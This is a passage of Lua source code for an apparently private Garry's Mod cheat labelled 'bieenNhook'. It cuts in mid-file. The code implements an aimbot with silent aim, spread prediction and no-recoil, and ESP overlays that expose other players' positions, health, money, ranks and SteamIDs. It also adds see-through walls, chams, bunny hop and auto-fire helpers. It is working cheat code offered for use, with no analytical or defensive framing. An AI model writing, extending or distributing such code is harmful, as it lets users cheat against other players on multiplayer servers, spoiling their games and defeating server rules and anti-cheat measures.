			if (gVal(options, "Aimbot", "Ignore Team") && pmt.Team(v) == pmt.Team(LocalPlayer())) then continue; end  	   
			if (gVal(options, "Aimbot", "Ignore Team Colour") && pmt.Team(v).GetColor == pmt.Team(LocalPlayer()).GetColor) then continue; end  	   
			if (gVal(options, "Aimbot", "Ignore Steam Friends") && pmt.GetFriendStatus(ent) == "friend") then continue; end  	   
			if (gVal(options, "Aimbot", "Ignore Bots") && pmt.IsBot(v)) then continue; end  	   
			if (gVal(options, "Aimbot", "Ignore Admins") && pmt.IsAdmin(v)) then continue; end  	   
			if (gVal(options, "Aimbot", "Ignore Spawn Protected") && (emt.GetColor(v).a < 255 || (emt.GetColor(v).a < 255 && gVal(floats, "Other", "GM") == 4))) then continue; end  	   
			  	   
			local trace =  	   
			{  	   
				start = LocalPlayer():GetShootPos(),  	   
				endpos = GetAimVec(v),  	   
				mask = MASK_SHOT,  	   
				filter = {LocalPlayer(), v}  	   
			};  	   
			if (util.TraceLine(trace).Fraction != 1) then continue; end  	   
			  	   
			if (gVal(options, "Aimbot", "Targeting Algorithm") == "NextShot") then  	   
				AimValid[#AimValid + 1] = v;  	   
			elseif (gVal(options, "Aimbot", "Targeting Algorithm") == "Distance") then  	   
				AimValid[#AimValid + 1] = v;  	   
			elseif (gVal(options, "Aimbot", "Targeting Algorithm") == "Angle") then  	   
				AimValid[#AimValid + 1] = v;  	   
			end  	   
		end  	   
		  	   
		if (gVal(options, "Aimbot", "Targeting Algorithm") == "NextShot") then  	   
			AimValid[1] = table.Random(AimValid);  	   
		end  	   
	end  	   
end  	   
  	   
local function GetESPValid()  	   
	EspValid = {};  	   
	if (gVal(options, "ESP", "Active")) then  	   
		for k, v in next, ents.GetAll() do  	   
			if (v:IsPlayer() && gVal(options, "ESP", "Show Players")) then  	   
				if (v != LocalPlayer() && IsValid(v) && emt.Health(v) > 0 && !emt.IsDormant(v) && pmt.GetObserverTarget(LocalPlayer()) != v) then  	   
					EspValid[#EspValid + 1] = v;  	   
				end  	   
			elseif (v:IsNPC() && gVal(options, "ESP", "Show NPC's")) then  	   
				if (IsValid(v) && emt.Health(v) > 0 && !emt.IsDormant(v)) then  	   
					EspValid[#EspValid + 1] = v;  	   
				end  	   
			elseif (gVal(options, "ESP", "Show SENT's") && !(v:IsPlayer() || v:IsNPC())) then  	   
				if (IsValid(v) && !v:IsDormant() && !(emt.GetParent(v):IsPlayer() || emt.GetParent(v):IsNPC()) && v:GetClass() != "gmod_hands" && v:GetClass() != "viewmodel") then  	   
					EspValid[#EspValid + 1] = v;  	   
				end  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
local function GetCurTime()  	   
	if (IsFirstTimePredicted()) then  	   
        sVal(floats, "Other", "Cur Time", CurTime()+engine.TickInterval());  	   
	end  	   
end  	   
  	   
local function CanFire()  	   
    local wep = pmt.GetActiveWeapon(LocalPlayer());  	   
    return IsValid(wep) && wmt.GetActivity(wep) != ACT_RELOAD && wmt.GetNextPrimaryFire(wep) < gVal(floats, "Other", "Cur Time") && pmt.Alive(LocalPlayer());  	   
end  	   
  	   
local function PredictSpread(cmd, ang)  	   
    local wep = LocalPlayer():GetActiveWeapon();  	   
    if (!IsValid(wep) || !cones[wep:GetClass()]) then return ang; end  	   
	wep = wep:GetClass();  	   
    local ang = (dickwrap.Predict(cmd, ang:Forward(), cones[wep])):Angle();  	   
	ang.x, ang.y = math.NormalizeAngle(ang.x), math.NormalizeAngle(ang.y);  	   
	return ang;  	   
end  	   
  	   
local function FakeView(cmd)  	   
	fake.p = math.Clamp(fake.p + (cmt.GetMouseY(cmd) * 0.022), -89, 89);  	   
	fake.y = math.NormalizeAngle(fake.y + (cmt.GetMouseX(cmd) * -0.022));  	   
	fake.r = 0;  	   
	  	   
	if (gVal(options, "Miscellaneous", "No Spread") && cmt.CommandNumber(cmd) != 0 && cmt.KeyDown(cmd, IN_ATTACK)) then  	   
		cmt.SetViewAngles(cmd, PredictSpread(cmd, fake));  	   
	end  	   
	  	   
	if (gVal(options, "Visuals", "Third Person")) then return; end  	   
	  	   
	if (cmt.CommandNumber(cmd) == 0) then  	   
        cmt.SetViewAngles(cmd, fake);  	   
	end  	   
end  	   
  	   
local function MoveFix(cmd)  	   
	if (emt.GetMoveType(LocalPlayer()) == MOVETYPE_NOCLIP && !gVal(floats, "Aimbot", "Aiming")) then return; end  	   
	local vec = Vector(cmt.GetForwardMove(cmd), cmt.GetSideMove(cmd), 0);  	   
	local vel = math.sqrt(vec.x*vec.x + vec.y*vec.y);  	   
	local mang = vmt.Angle(vec);  	   
	local yaw = cmt.GetViewAngles(cmd).y - fake.y + mang.y;  	   
	  	   
	if (((cmt.GetViewAngles(cmd).p+90)%360) > 180) then  	   
		yaw = 180 - yaw;  	   
	end  	   
	  	   
	yaw = ((yaw + 180)%360)-180;  	   
	  	   
	cmd:SetForwardMove(math.cos(math.rad(yaw)) * vel);  	   
	cmd:SetSideMove(math.sin(math.rad(yaw)) * vel);  	   
end  	   
  	   
local function SnapRotate(x, y, _x, _y)  	   
	local x = _x - x;  	   
	local y = _y - y;  	   
  	   
	local ang = math.atan2(y,x);  	   
	  	   
	local _x = math.cos(ang - 1.5708);  	   
	local _y = -math.cos(ang);  	   
	  	   
	_x = _x > 0 && math.ceil(_x) || math.floor(_x);  	   
	_y = _y > 0 && math.ceil(_y) || math.floor(_y);  	   
	  	   
	return _x, _y;  	   
end  	   
  	   
local function GetColour(v)  	   
	if (v:IsPlayer()) then  	   
		if (pmt.Team(v) == pmt.Team(LocalPlayer())) then  	   
			return Color(gVal(options, "Colours", "Team - R"), gVal(options, "Colours", "Team - G"), gVal(options, "Colours", "Team - B"));  	   
		else  	   
			return Color(gVal(options, "Colours", "Enemy - R"), gVal(options, "Colours", "Enemy - G"), gVal(options, "Colours", "Enemy - B"));  	   
		end  	   
	elseif (v:IsNPC()) then  	   
		return Color(gVal(options, "Colours", "Npc - R"), gVal(options, "Colours", "Npc - G"), gVal(options, "Colours", "Npc - B"));  	   
	else  	   
		return Color(gVal(options, "Colours", "Entity - R"), gVal(options, "Colours", "Entity - G"), gVal(options, "Colours", "Entity - B"));  	   
	end  	   
end  	   
  	   
/*  	   
AIMBOT  	   
*/  	   
  	   
local function AimBot(cmd)  	   
	if (gVal(options, "Aimbot", "Active") && emt.Health(LocalPlayer()) > 0) then  	   
		if (AimValid[1] == nil || gVal(options, "Aimbot", "Perfect Silent") == bSendPacket || ((gVal(options, "Aimbot", "Perfect Silent") || gVal(options, "Aimbot", "Silent")) && cmt.CommandNumber(cmd) == 0)) then  	   
			sVal(floats, "Aimbot", "Aiming", false);   	   
			return;   	   
		end  	   
		  	   
		if ((gVal(options, "Aimbot", "On Key") && !input.IsKeyDown(KEY_F)) || (gVal(options, "Aimbot", "On Mouse") && !input.IsMouseDown(MOUSE_LEFT)) || (gVal(options, "Aimbot", "Bullet Time") && !CanFire())) then  	   
			sVal(floats, "Aimbot", "Aiming", false);  	   
			return;   	   
		end  	   
		sVal(floats, "Aimbot", "Aiming", true);  	   
		  	   
		local ang = GetAimPos(GetAimVec(AimValid[1]));  	   
		  	   
		if (!(gVal(options, "Aimbot", "Silent") || gVal(options, "Aimbot", "Perfect Silent")) && cmt.CommandNumber(cmd) == 0) then  	   
			if (!gVal(options, "Aimbot", "Smooth")) then  	   
				fake = ang;  	   
			else  	   
				fake = LerpAngle(gVal(options, "Aimbot", "Smooth Int"), cmt.GetViewAngles(cmd), ang);  	   
			end  	   
		end  	   
		  	   
		if (cmt.CommandNumber(cmd) == 0) then return; end  	   
		  	   
		if (gVal(options, "Miscellaneous", "No Spread")) then  	   
			ang = PredictSpread(cmd, ang);  	   
		end  	   
		  	   
		if (gVal(options, "Miscellaneous", "No Punch") && pmt.GetActiveWeapon(LocalPlayer()).Author == "Spy") then  	   
			ang = ang - pmt.GetViewPunchAngles(LocalPlayer());  	   
		end  	   
		  	   
		if (gVal(options, "Aimbot", "Static")) then  	   
			ang.p = -(180 + ang.p);  	   
			ang.y = ang.y + 180;  	   
		end  	   
		  	   
		if (!gVal(options, "Aimbot", "Smooth") || gVal(options, "Aimbot", "Silent") || gVal(options, "Aimbot", "Perfect Silent")) then  	   
				cmd:SetViewAngles(ang);  	   
		else  	   
			cmd:SetViewAngles(LerpAngle(gVal(options, "Aimbot", "Smooth Int"), cmt.GetViewAngles(cmd), ang));  	   
		end  	   
		  	   
		if (gVal(options, "Aimbot", "Auto Shoot")) then  	   
			if (gVal(options, "Aimbot", "Auto Pistol") || gVal(options, "Miscellaneous", "Auto Pistol")) then  	   
				if (CanFire()) then  	   
					cmt.SetButtons(cmd, bit.bor(cmt.GetButtons(cmd), IN_ATTACK));  	   
				end  	   
			else  	   
				cmt.SetButtons(cmd, bit.bor(cmt.GetButtons(cmd), IN_ATTACK));  	   
			end  	   
		end  	   
  	   
		if (gVal(options, "Aimbot", "Auto Aim")) then  	   
			cmt.SetButtons(cmd, bit.bor(cmt.GetButtons(cmd), IN_ATTACK2));  	   
		end  	   
		  	   
		if (gVal(options, "Aimbot", "Auto Duck")) then  	   
			cmt.SetButtons(cmd, bit.bor(cmt.GetButtons(cmd), IN_DUCK));  	   
		end  	   
	end  	   
end  	   
  	   
/*  	   
ESP  	   
*/  	   
  	   
local function ESP()  	   
	if (gVal(options, "ESP", "Active")) then  	   
		for k, v in next, EspValid do  	   
			local min,max = emt.GetCollisionBounds(v);  	   
			local pos = emt.GetPos(v);  	   
			local _pos = vmt.ToScreen(pos);  	   
			local col = GetColour(v);  	   
			local textespy = -4;  	   
			local corners =  	   
			{  	   
				Vector(min.x,min.y,min.z),  	   
				Vector(min.x,max.y,min.z),  	   
				Vector(max.x,max.y,min.z),  	   
				Vector(max.x,min.y,min.z),  	   
				Vector(min.x,min.y,max.z),  	   
				Vector(min.x,max.y,max.z),  	   
				Vector(max.x,max.y,max.z),  	   
				Vector(max.x,min.y,max.z)  	   
			};  	   
			  	   
			local _corners =  	   
			{  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(min.x,min.y,min.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(min.x,max.y,min.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(max.x,max.y,min.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(max.x,min.y,min.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(min.x,min.y,max.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(min.x,max.y,max.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(max.x,max.y,max.z))),  	   
				vmt.ToScreen(emt.LocalToWorld(v, Vector(max.x,min.y,max.z)))  	   
			};  	   
			local x1, y1, x2, y2 = ScrW()*2, ScrH()*2, -ScrW(), -ScrH();  	   
			  	   
			for _k, _v in next, _corners do  	   
				x1, y1 = math.min(x1, _v.x), math.min(y1, _v.y);  	   
				x2, y2 = math.max(x2, _v.x), math.max(y2, _v.y);  	   
			end  	   
			  	   
			local diff = math.abs(x2 - x1);  	   
			local diff2 = math.abs(y2 - y1);  	   
			  	   
			if (gVal(options, "ESP", "Filled Box")) then  	   
				if (gVal(options, "ESP", "Box Type") == "2D") then  	   
						DrawRect(x1, y1, diff, diff2, Color(col.r, col.g, col.b, 50))  	   
					elseif (gVal(options, "ESP", "Box Type") == "3D") then  	   
						surface.SetTexture(surface.GetTextureID("vgui/white"));  	   
						surface.SetDrawColor(col.r, col.g, col.b, 50);  	   
						  	   
						surface.DrawPoly({  	   
							{x = _corners[4].x, y = _corners[4].y},  	   
							{x = _corners[3].x, y = _corners[3].y},  	   
							{x = _corners[2].x, y = _corners[2].y},  	   
							{x = _corners[1].x, y = _corners[1].y}  	   
						})  	   
						  	   
						surface.DrawPoly({  	   
							{x = _corners[5].x, y = _corners[5].y},  	   
							{x = _corners[6].x, y = _corners[6].y},  	   
							{x = _corners[7].x, y = _corners[7].y},  	   
							{x = _corners[8].x, y = _corners[8].y}  	   
						})  	   
						  	   
						for i = 1, 4 do  	   
							surface.DrawPoly({  	   
								{x = _corners[i].x, y = _corners[i].y},  	   
								{x = _corners[i%4+1].x, y = _corners[i%4+1].y},  	   
								{x = _corners[i%4+5].x, y = _corners[i%4+5].y},  	   
								{x = _corners[i+4].x, y = _corners[i+4].y}  	   
							})  	   
						end  	   
  	   
					end  	   
				end  	   
			  	   
			if (gVal(options, "ESP", "Box")) then  	   
				if (gVal(options, "ESP", "Box Type") == "2D") then  	   
					DrawOutlinedRect(x1-1, y1-1, diff+2, diff2+2, Color(0,0,0))  	   
					DrawOutlinedRect(x1+1, y1+1, diff-2, diff2-2, Color(0,0,0))  	   
					DrawOutlinedRect(x1, y1, diff, diff2, col)  	   
				elseif (gVal(options, "ESP", "Box Type") == "3D") then  	   
					for i = 1, 4 do  	   
						DrawLine(_corners[i].x, _corners[i].y, _corners[i%4+1].x, _corners[i%4+1].y, col)  	   
						DrawLine(_corners[i].x, _corners[i].y, _corners[i+4].x, _corners[i+4].y, col)  	   
						DrawLine(_corners[i+4].x, _corners[i+4].y, _corners[i%4+5].x, _corners[i%4+5].y, col)  	   
					end  	   
				end  	   
			end  	   
		  	   
			if (gVal(options, "ESP", "Snapline")) then  	   
				local snapstartx = ScrW()/2;  	   
				local snapstarty, snapendx, snapendy;  	   
				if ((gVal(options, "ESP", "Box") || gVal(options, "ESP", "Filled Box")) && gVal(options, "ESP", "Box Type") == "2D") then  	   
					snapendx = (x1 + x2)/2;  	   
					snapendy = y2;  	   
				else  	   
					snapendx = _pos.x;  	   
					snapendy = _pos.y;  	   
				end  	   
				snapstartx = ScrW()/2;  	   
				if (gVal(options, "ESP", "Snapline Pos") == "Center") then  	   
					snapstarty = ScrH()/2;  	   
				elseif (gVal(options, "ESP", "Snapline Pos") == "Bottom") then  	   
					snapstarty = ScrH();  	   
				end  	   
				local offsetx, offsety = SnapRotate(snapstartx, snapstarty, vmt.ToScreen(emt.GetPos(v)).x, vmt.ToScreen(emt.GetPos(v)).y);  	   
				if (math.abs(snapendx) < ScrW()*5 && math.abs(snapendy) < ScrH()*5) then  	   
					DrawLine(snapstartx-offsetx, snapstarty-offsety, snapendx-offsetx, snapendy-offsety, Color(0,0,0))  	   
					DrawLine(snapstartx+offsetx, snapstarty+offsety, snapendx+offsetx, snapendy+offsety, Color(0,0,0))  	   
					DrawLine(snapstartx, snapstarty, snapendx, snapendy, col)  	   
				end  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Healthbar") && emt.Health(v) > 0) then  	   
				DrawRect(x1-6, y1,3,diff2-2, col)  	   
				DrawLine(x1-5, y1+1, x1-5, y2-1, Color(0, 0, 0))  	   
				DrawRect(x1-6, y2-(diff2/emt.GetMaxHealth(v)*math.Clamp(emt.Health(v), 0, emt.GetMaxHealth(v))), 3, diff2/emt.GetMaxHealth(v)*math.Clamp(emt.Health(v), 0, emt.GetMaxHealth(v)), emt.Health(v)/emt.GetMaxHealth(v) > 0.2 && Color(0,255,0) || Color(255,0,0))  	   
				DrawOutlinedRect(x1-7, y1-1, 5, diff2+2, Color(0, 0, 0))  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Armourbar") && v:IsPlayer() && pmt.Armor(v) > 0) then  	   
				DrawRect(x1-6-(gVal(options, "ESP", "Healthbar") && 6 || 0), y1,3,diff2-2, col)  	   
				DrawLine(x1-5-(gVal(options, "ESP", "Healthbar") && 6 || 0), y1+1, x1-5-(gVal(options, "ESP", "Healthbar") && 6 || 0), y2-1, Color(0, 0, 0))  	   
				DrawRect(x1-6-(gVal(options, "ESP", "Healthbar") && 6 || 0), y2-(diff2/100*math.Clamp(pmt.Armor(v), 0, 100)), 3, diff2/100*math.Clamp(pmt.Armor(v), 0, 100), Color(0, 160, 255))  	   
				DrawOutlinedRect(x1-7-(gVal(options, "ESP", "Healthbar") && 6 || 0), y1-1, 5, diff2+2, Color(0, 0, 0))  	   
			end  	   
			  	   
			if ((gVal(options, "ESP", "HitBox") || gVal(options, "ESP", "Filled HitBox")) && (v:IsPlayer() || v:IsNPC())) then  	   
				for i = 0, emt.GetHitBoxGroupCount(v) - 1 do  	   
					for _i = 0, emt.GetHitBoxCount(v, i) - 1 do  	   
						local bone = emt.GetHitBoxBone(v, _i, i);  	   
						if(!bone) then continue; end  	   
						local min, max = emt.GetHitBoxBounds(v, _i, i);  	   
						if (emt.GetBonePosition(v,bone)) then  	   
							local pos, ang = emt.GetBonePosition(v, bone);  	   
							cam.Start3D();  	   
								if (gVal(options, "ESP", "HitBox")) then  	   
									render.DrawWireframeBox(pos, ang, min, max, col);  	   
								end  	   
								if (gVal(options, "ESP", "Filled HitBox")) then  	   
									render.SetMaterial(Material("color"))  	   
									render.DrawBox(pos, ang, min, max, Color(col.r, col.g, col.b, 50));  	   
								end  	   
							cam.End3D();  	   
						end  	   
					end  	   
				end  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Skeleton") && (v:IsPlayer() || v:IsNPC())) then  	   
				for i = 1, emt.GetBoneCount(v) do  	   
					local Parent = emt.GetBoneParent(v, i);  	   
					if (Parent == -1) then continue; end  	   
					local FirstBone,SecondBone = emt.GetBonePosition(v, i), emt.GetBonePosition(v, Parent);  	   
					if (emt.GetPos(v) == FirstBone) then continue; end  	   
					local LineStart, LineEnd = vmt.ToScreen(FirstBone), vmt.ToScreen(SecondBone);  	   
					DrawLine(LineStart.x, LineStart.y, LineEnd.x, LineEnd.y, Color(255, 255, 255))  	   
				end  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Barrel") && v:IsPlayer()) then  	   
				local b1, b2 = vmt.ToScreen(emt.EyePos(v)), vmt.ToScreen(pmt.GetEyeTrace(v).HitPos);  	   
				if (math.abs(b1.x) < ScrW()*5 && math.abs(b1.y) < ScrH()*5 && math.abs(b2.x) < ScrW()*5 && math.abs(b2.y) < ScrH()*5) then  	   
					DrawLine(b1.x, b1.y, b2.x, b2.y, col)  	   
				end  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Aim Pos") && v:IsPlayer()) then  	   
				DrawOutlinedRect(vmt.ToScreen(GetAimVec(v)).x-2, vmt.ToScreen(GetAimVec(v)).y-2, 5, 5, Color(0,0,0));  	   
				DrawRect(vmt.ToScreen(GetAimVec(v)).x-1, vmt.ToScreen(GetAimVec(v)).y-1, 3, 3, GetColour(v));  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Name")) then  	   
				DrawText(v:IsPlayer() && pmt.Nick(v) || emt.GetClass(v), "ESPFont", x1, y1, col, "l", "b")  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Health") && emt.Health(v) > 0) then  	   
				DrawText(emt.Health(v) .. " HP", "ESPFont", x2, y2-1, Color(0, 255,0), "r", "t")  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Armour") && v:IsPlayer() && pmt.Armor(v) > 0) then  	   
				DrawText(pmt.Armor(v) .. " AP", "ESPFont", x2, y2-1+(gVal(options, "ESP", "Health") && 12 || 0), Color(0, 160, 255), "r", "t")  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Weapon") && (v:IsPlayer() || v:IsNPC()) && IsValid(v:GetActiveWeapon())) then  	   
				DrawText(wmt.GetPrintName(v:GetActiveWeapon()), "ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				textespy = textespy + 12;  	   
			end  	   
  	   
			if (gVal(options, "ESP", "Distance")) then  	   
				DrawText(math.Round(vmt.Length((emt.GetPos(LocalPlayer()) - emt.GetPos(v)))*0.0190625, 1) .. "m","ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				textespy = textespy + 12;  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Money") && gVal(floats, "Other", "GM") == 3 && v:IsPlayer() && v.DarkRPVars) then  	   
				DrawText("$" .. v.DarkRPVars.money, "ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				textespy = textespy + 12;  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Rank") && v:IsPlayer()) then  	   
				DrawText(v:GetUserGroup(), "ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				textespy = textespy + 12;  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "SteamID") && v:IsPlayer()) then  	   
				if (pmt.IsBot(v)) then  	   
					DrawText("BOT", "ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				else  	   
					DrawText(pmt.SteamID(v), "ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				end  	   
				textespy = textespy + 12;  	   
			end  	   
			  	   
			if (gVal(options, "ESP", "Points") && v:IsPlayer() && v.PS_Points) then  	   
				DrawText("å††" .. v.PS_Points, "ESPFont", x2 + 1, y1 + textespy, col, "l", "t")  	   
				textespy = textespy + 12;  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
local function Chams()  	   
	if (gVal(options, "ESP", "Active") && (gVal(options, "ESP", "Chams") || gVal(options, "ESP", "Weapon Chams"))) then  	   
		for k,v in next, EspValid do  	   
			if (v:IsPlayer() || v:IsNPC()) then  	   
				local col = GetColour(v);  	   
				if (gVal(options, "ESP", "Chams")) then  	   
					cam.Start3D();  	   
						if (gVal(options, "ESP", "XQZ")) then  	   
							render.SuppressEngineLighting(gVal(options, "ESP", "Chams Mat") == "Plain");  	   
							render.MaterialOverride(CMatZ);  	   
							render.SetColorModulation(col.r/170, col.g/170, col.b/170, 255);  	   
							emt.DrawModel(v);  	   
						end  	   
						render.SuppressEngineLighting(gVal(options, "ESP", "Chams Mat") == "Plain");  	   
						render.SetColorModulation(col.r/255, col.g/255, col.b/255, 255);  	   
						render.MaterialOverride(CMat);  	   
						emt.DrawModel(v);  	   
					cam.End3D();  	   
				end  	   
				  	   
				if (gVal(options, "ESP", "Weapon Chams") && IsValid(v:GetActiveWeapon())) then  	   
					cam.Start3D();  	   
						local wep = v:GetActiveWeapon()  	   
						if (gVal(options, "ESP", "XQZ")) then  	   
							render.SuppressEngineLighting(gVal(options, "ESP", "Chams Mat") == "Plain");  	   
							render.MaterialOverride(CMatZ);  	   
							render.SetColorModulation(col.r/255, col.g/255, col.b/255, 255);  	   
							emt.DrawModel(wep);  	   
						end  	   
						render.SuppressEngineLighting(gVal(options, "ESP", "Chams Mat") == "Plain");  	   
						render.SetColorModulation(col.r/170, col.g/170, col.b/170, 255);  	   
						render.MaterialOverride(CMat);  	   
						emt.DrawModel(wep);  	   
					cam.End3D();  	   
				end  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
  	   
/*  	   
VISUALS  	   
*/  	   
 --[[ 	   
local function Laser()  	   
	if (gVal(options, "Visuals", "Laser") && pmt.Alive(LocalPlayer()) && IsValid(pmt.GetActiveWeapon(LocalPlayer())) && IsValid(pmt.GetViewModel(LocalPlayer()))) then  	   
		local wep = pmt.GetViewModel(LocalPlayer());  	   
		if (emt.GetAttachment(wep, 1) && emt.GetAttachment(wep, 1) != 0 && emt.GetClass(pmt.GetActiveWeapon(LocalPlayer())) != "weapon_crowbar") then  	   
			cam.Start3D()  	   
				local l1 = gVal(options, "Visuals", "Third Person") && pmt.GetShootPos(LocalPlayer()) || emt.GetAttachment(wep, 1).Pos;  	   
				local l2 = pmt.GetEyeTrace(LocalPlayer()).HitPos;  	   
				render.DrawLine(l1, l2, Color(gVal(options, "Colours", "Team - R"), gVal(options, "Colours", "Team - G"), gVal(options, "Colours", "Team - B")))  	   
			cam.End3D()  	   
		end  	   
	end  	   
end  	   
--]] 
 
local function ASUSWalls()  	   
	if (gVal(options, "Visuals", "ASUS Walls") != gVal(floats, "Visuals", "ASUS Walls")) then  	   
		for k, v in next, emt.GetMaterials(Entity(0)) do  	   
			imt.SetFloat(Material(v), "$alpha", gVal(options, "Visuals", "ASUS Walls"))  	   
		end  	   
		sVal(floats, "Visuals", "ASUS Walls", gVal(options, "Visuals", "ASUS Walls"))  	   
	end  	   
end  	   
  	   
local function Watermark()
	if (gVal(options, "Visuals", "Watermark")) then    	   
		rainbow = {}
		rainbow.R = math.sin(CurTime() * 4) * 127 + 128
		rainbow.G = math.sin(CurTime() * 4 + 2) * 127 + 128
		rainbow.B = math.sin(CurTime() * 4 + 4) * 127 + 128
	
		local h = ScrH() / 1
		local w = ScrW() / 5
 
		draw.SimpleText("bieenNhook private", "Watermark", 20, 30, Color(rainbow.R, rainbow.G, rainbow.B), TEXT_ALIGN_LEFT, TEXT_ALIGN_BOTTOM) 
	end
end 	   
  	   
local function Crosshair()  	   
	if (gVal(options, "Visuals", "Crosshair")) then  	   
		pmt.GetActiveWeapon(LocalPlayer()).DrawCrosshair = false;  	   
		local x1, y1 = ScrW() * 0.5, ScrH() * 0.5;  	   
		if (gVal(options, "Visuals", "Crosshair Type") == "Simple") then  	   
			DrawOutlinedRect(x1-2, y1-2, 5, 5, Color(0,0,0));  	   
			DrawRect(x1-1, y1-1, 3, 3, Color(255,255,255));  	   
		elseif (gVal(options, "Visuals", "Crosshair Type") == "Generic") then  	   
			DrawLine(x1+5, y1, x1+20, y1, Color(0, 255, 0));  	   
			DrawLine(x1-5, y1, x1-20, y1, Color(0, 255, 0));  	   
			DrawLine(x1, y1+5, x1, y1+20, Color(0, 255, 0));  	   
			DrawLine(x1, y1-5, x1, y1-20, Color(0, 255, 0));
		elseif (gVal(options, "Visuals", "Crosshair Type") == "Aimware") then  	   
			DrawLine(x1+10, y1, x1-10, y1, Color(255, 255, 255));
			DrawLine(x1, y1+10, x1, y1-10, Color(255, 255, 255));
			DrawLine(x1+8, y1, x1-8, y1, Color(255, 0, 0));
			DrawLine(x1, y1+8, x1, y1-8, Color(255, 0, 0));			
		end  	   
	end  	   
end  	   
  	   
/*  	   
MISCELLANEOUS  	   
*/  	   
  	   
local function BunnyHop(cmd)  	   
	if (gVal(options, "Miscellaneous", "Bunny Hop") && !pmt.IsTyping(LocalPlayer()) && !emt.OnGround(LocalPlayer()) && emt.WaterLevel(LocalPlayer()) < 2 && emt.GetMoveType(LocalPlayer()) != 8 && emt.GetMoveType(LocalPlayer()) != 9) then  	   
		cmt.RemoveKey(cmd, IN_JUMP);  	   
	end  	   
end  	   
  	   
local function EdgeJump(cmd)  	   
	if (gVal(options, "Miscellaneous", "Edge Jump") && emt.IsOnGround(LocalPlayer()) && emt.WaterLevel(LocalPlayer()) < 2 && emt.GetMoveType(LocalPlayer()) != 8 && emt.GetMoveType(LocalPlayer()) != 9) then  	   
		local StartPos = emt.GetPos(LocalPlayer());  	   
		local EndPos = emt.GetPos(LocalPlayer()) - Vector(0,0,18);  	   
		local DirVec = Vector(amt.Forward(vmt.Angle(emt.GetVelocity(LocalPlayer()))).x, amt.Forward(vmt.Angle(emt.GetVelocity(LocalPlayer()))).y, 0) * 8;  	   
		local DirVec2 = Vector(amt.Forward(vmt.Angle(emt.GetVelocity(LocalPlayer()))).x, amt.Forward(vmt.Angle(emt.GetVelocity(LocalPlayer()))).y, 0) * 16;  	   
		local First = {  	   
			start = StartPos - DirVec,  	   
			endpos = EndPos - DirVec,  	   
			filter = LocalPlayer(),  	   
			mask = MASK_PLAYERSOLID  	   
		};  	   
		local Second = {  	   
			start = StartPos - DirVec2,  	   
			endpos = EndPos - DirVec2,  	   
			filter = LocalPlayer(),  	   
			mask = MASK_PLAYERSOLID  	   
		};  	   
		if (util.TraceLine(First).Fraction == 1 && util.TraceLine(Second).Fraction != 1) then  	   
			cmt.SetButtons(cmd, bit.bor(cmt.GetButtons(cmd), IN_JUMP));  	   
		end  	   
	end  	   
end  	   
  	   
local function AutoPistol(cmd)  	   
	if (gVal(options, "Miscellaneous", "Auto Pistol")) then  	   
		if (cmt.KeyDown(cmd, IN_ATTACK) && pmt.Alive(LocalPlayer()) && IsValid(pmt.GetActiveWeapon(LocalPlayer())) && pmt.GetActiveWeapon(LocalPlayer()).Primary && pmt.GetActiveWeapon(LocalPlayer()).Primary.Delay == nil && pmt.GetActiveWeapon(LocalPlayer()).Primary.RPM == nil) then  	   
			if (gVal(floats, "Miscellaneous", "Auto Pistol")) then  	   
				cmt.RemoveKey(cmd, IN_ATTACK);  	   
				sVal(floats, "Miscellaneous", "Auto Pistol", false);  	   
			else  	   
				sVal(floats, "Miscellaneous", "Auto Pistol", true);  	   
			end  	   
		else  	   
			if (!CanFire()) then  	   
				cmt.RemoveKey(cmd, IN_ATTACK);  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
local function AutoAim(cmd)  	   
	if (gVal(options, "Miscellaneous", "Auto Aim")) then  	   
		if (cmt.KeyDown(cmd, IN_ATTACK2) && pmt.Alive(LocalPlayer())) then  	   
			if (gVal(floats, "Miscellaneous", "Auto Aim")) then  	   
				cmt.RemoveKey(cmd, IN_ATTACK2);  	   
				sVal(floats, "Miscellaneous", "Auto Aim", false);  	   
			else  	   
				sVal(floats, "Miscellaneous", "Auto Aim", true);  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
local function AutoUse(cmd)  	   
	if (gVal(options, "Miscellaneous", "Auto Use")) then  	   
		if (cmt.KeyDown(cmd, IN_USE) && pmt.Alive(LocalPlayer())) then  	   
			if (gVal(floats, "Miscellaneous", "Auto Use")) then  	   
				cmt.RemoveKey(cmd, IN_USE);  	   
				sVal(floats, "Miscellaneous", "Auto Use", false);  	   
			else  	   
				sVal(floats, "Miscellaneous", "Auto Use", true);  	   
			end  	   
		end  	   
	end  	   
end  	   
  	   
local function AutoFlash(cmd)  	   
	if (gVal(options, "Miscellaneous", "Auto Flash")) then  	   
		RunConsoleCommand("impulse", "100");  	   
	end  	   
end  	   
  	   
local function AutoStrafer(cmd)  	   
